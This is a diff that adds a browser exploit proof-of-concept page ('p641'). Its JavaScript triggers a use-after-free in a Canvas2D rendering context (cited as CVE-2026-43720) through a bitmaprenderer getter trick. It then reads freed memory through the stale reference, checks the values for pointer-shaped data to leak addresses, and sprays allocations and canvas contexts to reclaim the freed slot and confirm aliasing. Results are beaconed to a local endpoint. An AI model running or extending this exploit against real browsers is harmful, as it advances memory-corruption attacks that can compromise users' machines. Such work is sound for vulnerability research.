@@ -1,0 +1,488 @@
+<!--
+  p641: Canvas2D UAF stale read — read freed CanvasRenderingContext2D WITHOUT spray
+
+  CRASH_CLASS: HIGH — reading freed memory without reclaim, likely crash
+
+  Theory: after CVE-2026-43720 UAF, the freed 768B CanvasRenderingContext2D
+  still contains its original data (vtable at +0x00, state stack pointer, etc).
+  If we read properties through the stale `inner` reference BEFORE anything
+  reclaims the slot, we access the original object's data. If the memory is
+  intact, reads return the original values. If it's been reclaimed by something
+  else, we might see pointer-shaped values (info leak) or crash.
+
+  Strategy:
+  A) Set distinctive values on the 2d context BEFORE triggering the UAF
+  B) Trigger the UAF (bitmaprenderer + alpha getter)
+  C) DON'T spray — read immediately through stale `inner`
+  D) Compare read values with pre-set values
+  E) If values match → memory intact, no leak
+  F) If values are different → memory reclaimed, check for pointer-shaped data
+  G) If crash → freed memory was reclaimed by something incompatible
+
+  Also: try reading with varying delays (0ms, 10ms, 50ms, 100ms) to see if
+  the freed memory gets reclaimed over time.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p641</title></head>
+<body>p641: Canvas2D UAF stale read (no spray)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6);
+  for (var i = 0; i < b.length; i++) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', '/beacon/P641-' + encodeURIComponent(b[i]), false);
+      x.send();
+    } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,200)); flush(); };
+
+emit('START', 'v2');
+flush();
+
+// helper: interpret double's raw bits as hex
+function dblHex(d) {
+  try {
+    var buf = new ArrayBuffer(8);
+    var f = new Float64Array(buf);
+    var u = new BigUint64Array(buf);
+    f[0] = d;
+    return '0x' + u[0].toString(16);
+  } catch(e) { return 'err'; }
+}
+
+function isPointerLike(d) {
+  if (typeof d !== 'number' || isNaN(d) || !isFinite(d)) return false;
+  try {
+    var buf = new ArrayBuffer(8);
+    var f = new Float64Array(buf);
+    var u = new BigUint64Array(buf);
+    f[0] = d;
+    var v = u[0];
+    // Kernel pointer: 0xFFFF8xxx...
+    if (v >= 0xFFFF800000000000n && v <= 0xFFFFFFFFFFFFFFFFn) return 'kptr';
+    // Userland pointer: 0x0000_0001_xxxx - 0x0000_7FFF_xxxx
+    if (v >= 0x100000000n && v <= 0x7FFFFFFFFFFFn) return 'uptr';
+    // WebKit text: typically 0x1xxxxx or 0x7fxxxxxx range
+    if (v >= 0x10000n && v <= 0xFFFFFFFFn && v !== 0n) return 'low32';
+    return false;
+  } catch(e) { return false; }
+}
+
+// ================================================================
+// SECTION A+B: Trigger CVE-2026-43720, set values INSIDE getter
+// (Cannot pre-create 2d context — getContext('bitmaprenderer') returns
+// null if canvas already has a context type)
+// ================================================================
+emit('A', 'trigger v2');
+flush();
+
+var uafCanvas = document.createElement('canvas');
+uafCanvas.width = 1;
+uafCanvas.height = 1;
+
+var innerCtx = null;
+var getterFired = false;
+var opts = {};
+Object.defineProperty(opts, 'alpha', {
+  get: function() {
+    getterFired = true;
+    innerCtx = uafCanvas.getContext('2d');
+    if (innerCtx) {
+      // Set distinctive values WHILE the context is still alive
+      // After getter returns, bitmaprenderer creation frees it
+      innerCtx.lineWidth = 13.37;
+      innerCtx.miterLimit = 42.42;
+      innerCtx.globalAlpha = 0.777;
+      innerCtx.shadowBlur = 99.99;
+      innerCtx.shadowOffsetX = 111.1;
+      innerCtx.shadowOffsetY = 222.2;
+      innerCtx.lineDashOffset = 333.3;
+      innerCtx.setTransform(1.11, 2.22, 3.33, 4.44, 5.55, 6.66);
+    }
+    return true;
+  }
+});
+
+var outerResult = null;
+try {
+  outerResult = uafCanvas.getContext('bitmaprenderer', opts);
+} catch(e) {
+  emit('A-ERR', e.message);
+}
+
+emit('A', 'getter=' + getterFired + ' inner=' + !!innerCtx + ' outer=' + !!outerResult);
+flush();
+
+if (!innerCtx) {
+  emit('A', 'DEAD — no inner');
+  emit('DONE', 'v2-no-inner');
+  flush();
+  throw new Error('abort');
+}
+
+// ================================================================
+// SECTION C: IMMEDIATE stale read (0ms delay, no spray)
+// Read all accessible properties through the stale innerCtx
+// ================================================================
+emit('C', 'immediate-read');
+flush();
+
+var props = {};
+var crashed = false;
+
+try {
+  props.lineWidth = innerCtx.lineWidth;
+  props.miterLimit = innerCtx.miterLimit;
+  props.globalAlpha = innerCtx.globalAlpha;
+  props.shadowBlur = innerCtx.shadowBlur;
+  props.shadowOffsetX = innerCtx.shadowOffsetX;
+  props.shadowOffsetY = innerCtx.shadowOffsetY;
+  props.lineDashOffset = innerCtx.lineDashOffset;
+} catch(e) {
+  emit('C-CRASH', 'props: ' + String(e).slice(0,80));
+  crashed = true;
+}
+flush();
+
+if (!crashed) {
+  // Report raw values
+  emit('C-LW', 'val=' + props.lineWidth + ' hex=' + dblHex(props.lineWidth) +
+       ' match=' + (props.lineWidth === 13.37) + ' ptr=' + isPointerLike(props.lineWidth));
+  emit('C-ML', 'val=' + props.miterLimit + ' hex=' + dblHex(props.miterLimit) +
+       ' match=' + (props.miterLimit === 42.42) + ' ptr=' + isPointerLike(props.miterLimit));
+  emit('C-GA', 'val=' + props.globalAlpha + ' hex=' + dblHex(props.globalAlpha) +
+       ' match=' + (props.globalAlpha === 0.777) + ' ptr=' + isPointerLike(props.globalAlpha));
+  emit('C-SB', 'val=' + props.shadowBlur + ' hex=' + dblHex(props.shadowBlur) +
+       ' match=' + (props.shadowBlur === 99.99) + ' ptr=' + isPointerLike(props.shadowBlur));
+  emit('C-SOX', 'val=' + props.shadowOffsetX + ' hex=' + dblHex(props.shadowOffsetX) +
+       ' match=' + (props.shadowOffsetX === 111.1) + ' ptr=' + isPointerLike(props.shadowOffsetX));
+  emit('C-SOY', 'val=' + props.shadowOffsetY + ' hex=' + dblHex(props.shadowOffsetY) +
+       ' match=' + (props.shadowOffsetY === 222.2) + ' ptr=' + isPointerLike(props.shadowOffsetY));
+  emit('C-LDO', 'val=' + props.lineDashOffset + ' hex=' + dblHex(props.lineDashOffset) +
+       ' match=' + (props.lineDashOffset === 333.3) + ' ptr=' + isPointerLike(props.lineDashOffset));
+  flush();
+
+  // getTransform
+  try {
+    var tx = innerCtx.getTransform();
+    emit('C-TX', 'a=' + tx.a + ' b=' + tx.b + ' c=' + tx.c +
+         ' d=' + tx.d + ' e=' + tx.e + ' f=' + tx.f);
+    emit('C-TX-HEX', 'a=' + dblHex(tx.a) + ' d=' + dblHex(tx.d));
+    emit('C-TX-MATCH', (tx.a === 1.11 && tx.d === 4.44) ? 'yes' : 'no');
+
+    var txPtrs = [];
+    if (isPointerLike(tx.a)) txPtrs.push('a:' + isPointerLike(tx.a));
+    if (isPointerLike(tx.b)) txPtrs.push('b:' + isPointerLike(tx.b));
+    if (isPointerLike(tx.c)) txPtrs.push('c:' + isPointerLike(tx.c));
+    if (isPointerLike(tx.d)) txPtrs.push('d:' + isPointerLike(tx.d));
+    if (isPointerLike(tx.e)) txPtrs.push('e:' + isPointerLike(tx.e));
+    if (isPointerLike(tx.f)) txPtrs.push('f:' + isPointerLike(tx.f));
+    if (txPtrs.length > 0) {
+      emit('C-TX-PTR', '*** POINTER-LIKE: ' + txPtrs.join(' ') + ' ***');
+    }
+  } catch(e) {
+    emit('C-TX-ERR', String(e).slice(0,80));
+  }
+  flush();
+
+  // fillStyle / strokeStyle (string props)
+  try {
+    var fs = innerCtx.fillStyle;
+    var ss = innerCtx.strokeStyle;
+    emit('C-STR', 'fill=' + fs + ' stroke=' + ss);
+  } catch(e) {
+    emit('C-STR-ERR', String(e).slice(0,60));
+  }
+
+  // canvas property (might reveal canvas dimensions of reclaimed object)
+  try {
+    var cv = innerCtx.canvas;
+    emit('C-CANVAS', 'exists=' + !!cv + ' w=' + (cv ? cv.width : '?') +
+         ' h=' + (cv ? cv.height : '?'));
+  } catch(e) {
+    emit('C-CANVAS-ERR', String(e).slice(0,60));
+  }
+  flush();
+
+  // Summary
+  var allMatch = (props.lineWidth === 13.37 && props.miterLimit === 42.42 &&
+                  props.globalAlpha === 0.777);
+  var anyPtr = isPointerLike(props.lineWidth) || isPointerLike(props.miterLimit) ||
+               isPointerLike(props.globalAlpha) || isPointerLike(props.shadowBlur);
+  emit('C-SUMMARY', 'allMatch=' + allMatch + ' anyPtr=' + anyPtr);
+  if (allMatch) {
+    emit('C-VERDICT', 'memory INTACT — original values preserved (no info leak)');
+  } else if (anyPtr) {
+    emit('C-VERDICT', '*** POINTER DATA — possible info leak ***');
+  } else {
+    emit('C-VERDICT', 'values changed but not pointer-like — memory reclaimed by other object');
+  }
+  flush();
+}
+
+// ================================================================
+// SECTION D: Delayed reads (10ms, 50ms, 100ms, 500ms)
+// Memory may be reclaimed over time as allocator runs
+// ================================================================
+function delayedRead(delayMs, tag) {
+  return new Promise(function(resolve) {
+    setTimeout(function() {
+      try {
+        var lw = innerCtx.lineWidth;
+        var ml = innerCtx.miterLimit;
+        var ga = innerCtx.globalAlpha;
+        var sb = innerCtx.shadowBlur;
+        emit(tag, 'lw=' + lw + ' ml=' + ml + ' ga=' + ga + ' sb=' + sb);
+
+        var ptrs = [];
+        if (isPointerLike(lw)) ptrs.push('lw:' + dblHex(lw));
+        if (isPointerLike(ml)) ptrs.push('ml:' + dblHex(ml));
+        if (isPointerLike(ga)) ptrs.push('ga:' + dblHex(ga));
+        if (isPointerLike(sb)) ptrs.push('sb:' + dblHex(sb));
+        if (ptrs.length > 0) {
+          emit(tag + '-PTR', '*** ' + ptrs.join(' ') + ' ***');
+        }
+
+        // Check if transform changed
+        try {
+          var tx = innerCtx.getTransform();
+          var anyTxPtr = isPointerLike(tx.a) || isPointerLike(tx.b) ||
+                         isPointerLike(tx.c) || isPointerLike(tx.d);
+          if (anyTxPtr) {
+            emit(tag + '-TX', '*** PTR: a=' + dblHex(tx.a) + ' b=' + dblHex(tx.b) +
+                 ' c=' + dblHex(tx.c) + ' d=' + dblHex(tx.d) + ' ***');
+          }
+        } catch(e) {}
+      } catch(e) {
+        emit(tag + '-CRASH', String(e).slice(0,80));
+      }
+      flush();
+      resolve();
+    }, delayMs);
+  });
+}
+
+// Chain delayed reads
+delayedRead(10, 'D-10ms').then(function() {
+  return delayedRead(50, 'D-50ms');
+}).then(function() {
+  return delayedRead(100, 'D-100ms');
+}).then(function() {
+  return delayedRead(500, 'D-500ms');
+}).then(function() {
+
+  // ================================================================
+  // SECTION E: Allocate objects to try to reclaim the freed 768B
+  // Then re-read — if reclaimed, values change and might contain pointers
+  // ================================================================
+  emit('E', 'alloc-pressure');
+  flush();
+
+  // Allocate various objects to create allocation pressure
+  var strs = [];
+  for (var i = 0; i < 200; i++) {
+    strs.push('A'.repeat(700 + (i % 100)));
+  }
+
+  var arrays = [];
+  for (var i = 0; i < 200; i++) {
+    arrays.push(new ArrayBuffer(768));
+  }
+
+  // Force GC
+  for (var i = 0; i < 5; i++) {
+    var tmp = [];
+    for (var j = 0; j < 10000; j++) tmp.push({x: j});
+    tmp = null;
+  }
+
+  // Read again after allocation pressure
+  try {
+    var lw = innerCtx.lineWidth;
+    var ml = innerCtx.miterLimit;
+    var ga = innerCtx.globalAlpha;
+    emit('E-READ', 'lw=' + lw + ' ml=' + ml + ' ga=' + ga);
+    emit('E-HEX', 'lw=' + dblHex(lw) + ' ml=' + dblHex(ml) + ' ga=' + dblHex(ga));
+
+    var matchOrig = (lw === 13.37 && ml === 42.42 && ga === 0.777);
+    var matchDefault = (lw === 1 && ml === 10 && ga === 1);
+    var ptrs = [];
+    if (isPointerLike(lw)) ptrs.push('lw');
+    if (isPointerLike(ml)) ptrs.push('ml');
+    if (isPointerLike(ga)) ptrs.push('ga');
+
+    emit('E-STATUS', 'origMatch=' + matchOrig + ' defaultMatch=' + matchDefault +
+         ' ptrs=' + ptrs.length);
+
+    if (ptrs.length > 0) {
+      emit('E-PTR', '*** POINTER-LIKE VALUES AFTER PRESSURE ***');
+    }
+
+    // Full transform dump
+    try {
+      var tx = innerCtx.getTransform();
+      emit('E-TX', 'a=' + dblHex(tx.a) + ' b=' + dblHex(tx.b) +
+           ' c=' + dblHex(tx.c) + ' d=' + dblHex(tx.d) +
+           ' e=' + dblHex(tx.e) + ' f=' + dblHex(tx.f));
+    } catch(e) {
+      emit('E-TX-ERR', String(e).slice(0,60));
+    }
+  } catch(e) {
+    emit('E-CRASH', String(e).slice(0,80));
+  }
+  flush();
+
+  // ================================================================
+  // SECTION F: Spray DIFFERENT type — 150 canvas 2d contexts
+  // Then read through innerCtx — should now see spray's default values
+  // The vtable at +0x00 of the reclaimed object IS a text base pointer
+  // Can we somehow observe it?
+  // ================================================================
+  emit('F', 'same-type-spray');
+  flush();
+
+  var sprayCtxs = [];
+  for (var i = 0; i < 150; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1;
+    c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) {
+      ctx.lineWidth = 7.0 + i * 0.001;
+      sprayCtxs.push(ctx);
+    }
+  }
+
+  try {
+    var lw = innerCtx.lineWidth;
+    var ml = innerCtx.miterLimit;
+    var ga = innerCtx.globalAlpha;
+    emit('F-READ', 'lw=' + lw + ' ml=' + ml + ' ga=' + ga);
+
+    // Detect alias
+    for (var i = 0; i < sprayCtxs.length; i++) {
+      if (sprayCtxs[i].lineWidth === lw && lw !== 7.0 + i * 0.001) continue;
+      if (Math.abs(sprayCtxs[i].lineWidth - lw) < 0.0001) {
+        emit('F-ALIAS', 'spray[' + i + '] lw=' + sprayCtxs[i].lineWidth);
+
+        // Set transform on innerCtx, read from spray[i]
+        innerCtx.setTransform(11.11, 22.22, 33.33, 44.44, 55.55, 66.66);
+        var stx = sprayCtxs[i].getTransform();
+        emit('F-TX', 'a=' + stx.a + ' match=' + (stx.a === 11.11));
+
+        // Set transform on spray[i], read from innerCtx
+        sprayCtxs[i].setTransform(99.1, 99.2, 99.3, 99.4, 99.5, 99.6);
+        var itx = innerCtx.getTransform();
+        emit('F-REV', 'a=' + itx.a + ' match=' + (itx.a === 99.1));
+
+        // Confirmed bidirectional alias = UAF working
+        emit('F-BIDIR', 'alias confirmed');
+        break;
+      }
+    }
+  } catch(e) {
+    emit('F-CRASH', String(e).slice(0,80));
+  }
+  flush();
+
+  // ================================================================
+  // SECTION G: Multiple attempts — trigger UAF in iframes for more tries
+  // Each iframe is a separate WebProcess realm but same heap
+  // ================================================================
+  emit('G', 'multi-attempt');
+  flush();
+
+  var attempts = 0;
+  var ptrFound = false;
+
+  function tryIframeUAF(idx) {
+    return new Promise(function(resolve) {
+      try {
+        var iframe = document.createElement('iframe');
+        iframe.srcdoc = '<canvas id="c"></canvas>';
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        setTimeout(function() {
+          try {
+            var iwin = iframe.contentWindow;
+            var iCanvas = iwin.document.getElementById('c');
+            if (!iCanvas) { emit('G-' + idx, 'no canvas'); resolve(); return; }
+
+            iCanvas.width = 1;
+            iCanvas.height = 1;
+
+            var iInner = null;
+            var iOpts = {};
+            Object.defineProperty(iOpts, 'alpha', {
+              get: function() {
+                iInner = iCanvas.getContext('2d');
+                return true;
+              }
+            });
+
+            iCanvas.getContext('bitmaprenderer', iOpts);
+
+            if (!iInner) { emit('G-' + idx, 'no inner'); resolve(); return; }
+
+            // Immediate read without spray
+            var ilw = iInner.lineWidth;
+            var iml = iInner.miterLimit;
+            var iga = iInner.globalAlpha;
+            var isb = iInner.shadowBlur;
+
+            var match = (ilw === 1 && iml === 10 && iga === 1 && isb === 0);
+            var ptrs = [];
+            if (isPointerLike(ilw)) ptrs.push('lw:' + dblHex(ilw));
+            if (isPointerLike(iml)) ptrs.push('ml:' + dblHex(iml));
+            if (isPointerLike(iga)) ptrs.push('ga:' + dblHex(iga));
+            if (isPointerLike(isb)) ptrs.push('sb:' + dblHex(isb));
+
+            if (ptrs.length > 0) {
+              ptrFound = true;
+              emit('G-' + idx + '-PTR', '*** ' + ptrs.join(' ') + ' ***');
+            } else {
+              emit('G-' + idx, 'default=' + match + ' lw=' + ilw);
+            }
+            attempts++;
+          } catch(e) {
+            emit('G-' + idx + '-ERR', String(e).slice(0,60));
+          }
+          flush();
+          resolve();
+        }, 100);
+      } catch(e) {
+        emit('G-' + idx + '-ERR', String(e).slice(0,60));
+        flush();
+        resolve();
+      }
+    });
+  }
+
+  // Run 5 iframe UAF attempts
+  tryIframeUAF(0).then(function() {
+    return tryIframeUAF(1);
+  }).then(function() {
+    return tryIframeUAF(2);
+  }).then(function() {
+    return tryIframeUAF(3);
+  }).then(function() {
+    return tryIframeUAF(4);
+  }).then(function() {
+    emit('G-SUMMARY', 'attempts=' + attempts + ' ptrFound=' + ptrFound);
+    emit('DONE', 'v2');
+    flush();
+  });
+});
+</script></body></html>
